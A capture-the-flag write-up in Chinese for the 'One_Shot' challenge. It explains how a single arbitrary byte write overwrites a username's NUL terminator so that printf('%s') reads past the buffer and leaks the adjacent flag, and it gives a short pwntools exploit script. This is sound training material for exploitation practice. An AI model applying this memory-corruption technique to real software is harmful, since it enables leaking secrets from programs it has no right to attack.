# One_Shot

## 题目简述

程序把用户名与 flag 连续存放在 `.bss` 段，随后提供一次“向任意地址写入一个字节”的机会，最后用 `printf("%s", name)` 输出用户名。正常情况下，用户名末尾的 `\0` 会阻止 `printf` 继续读到后面的 flag；利用目标就是破坏这个字符串终止符。

## 解题过程

先在反汇编或调试器中确认两个全局缓冲区的相对位置。题目构建中，`name` 后紧接着保存 flag 的区域，因此输入 31 个非零字节可以让 `name` 的末尾停在两个对象之间：

```python
from pwn import *

io = process("./One_Shot")

# 填满用户名区域，但保留程序自动补上的 NUL。
io.sendafter(b"name", b"A" * 31)

# 官方构建中需要覆盖的地址是 6295775；实际解题应以 ELF 符号
# 或调试结果为准，不能把该十进制地址照搬到其他构建。
io.sendlineafter(b"address", b"6295775")
io.sendafter(b"value", b"A")

io.interactive()
```

把原本位于用户名末尾的 `\0` 改成任意非零字节后，最后一次 `%s` 输出会从 `name` 开始连续读取，越过缓冲区边界并把相邻的 flag 一并打印出来。这里不需要劫持控制流；唯一的一次任意字节写应放在字符串边界上。

## 方法总结

- 核心技巧：用一次任意字节写破坏全局字符串的 NUL 终止符，让 `%s` 越界泄露相邻数据。
- 识别信号：敏感数据与可控字符串在 `.bss` 中相邻，程序又在写入后按 C 字符串输出。
- 复用要点：先核对符号地址、缓冲区长度和自动补零位置；题解中的绝对地址只适用于对应二进制。
